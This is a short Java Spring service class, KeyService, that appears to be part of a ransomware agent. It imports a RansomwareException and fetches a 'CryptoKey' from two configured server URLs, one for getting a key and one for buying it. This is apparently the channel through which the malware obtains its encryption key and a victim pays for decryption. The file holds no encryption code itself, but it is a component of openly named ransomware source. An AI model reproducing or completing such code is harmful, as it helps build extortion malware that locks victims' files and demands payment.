package Agent.services;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;

import com.github.raychatter.ExceptionHandler;

import Agent.Utils.HttpUtil;
import Agent.entites.CryptoKey;
import Agent.exceptions.HttpResException;
import Agent.exceptions.RansomwareException;

@Service
@ExceptionHandler
public class KeyService {
	@Value("${server.url.get}")
	private String urlgetKey;
	@Value("${server.url.buy}")
	private String urlbuyKey;

	
	public CryptoKey getKey() throws HttpResException {
		try {
			return HttpUtil.getKey(urlgetKey);
		} catch (RansomwareException e) {
			throw new HttpResException();
		}
	}

	public CryptoKey buykey() throws HttpResException {
		try {
			return HttpUtil.getKey(urlbuyKey);
		} catch (RansomwareException e) {
			throw new HttpResException();
		}
	}
}